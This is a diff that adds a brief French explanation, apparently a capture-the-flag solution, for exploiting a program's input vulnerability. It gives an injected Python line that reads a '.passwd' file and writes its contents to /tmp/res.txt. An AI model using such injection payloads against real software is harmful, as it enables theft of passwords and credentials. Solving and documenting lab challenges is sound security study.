@@ -1,0 +1,6 @@
+Explication :
+
+
+Il faut utilisé la vulnérabilité de l'input, commande finale =
+
+open("/tmp/res.txt","a").write(open(".passwd", "r").readline().strip())
